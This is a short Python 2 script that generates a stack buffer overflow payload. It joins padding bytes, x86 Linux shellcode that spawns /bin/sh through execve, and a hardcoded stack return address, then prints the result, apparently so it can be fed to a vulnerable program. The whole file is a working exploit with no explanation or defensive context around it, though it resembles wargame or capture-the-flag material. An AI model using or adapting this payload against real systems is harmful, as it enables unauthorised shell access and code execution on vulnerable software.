#!/usr/bin/env python

buf = "\xff"
a = "A"
shell = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

for x in range(0,16):
	buf = buf + a

buf = buf + shell + "AAA"
buf = buf + "\x08\xf6\xff\xbf"

print buf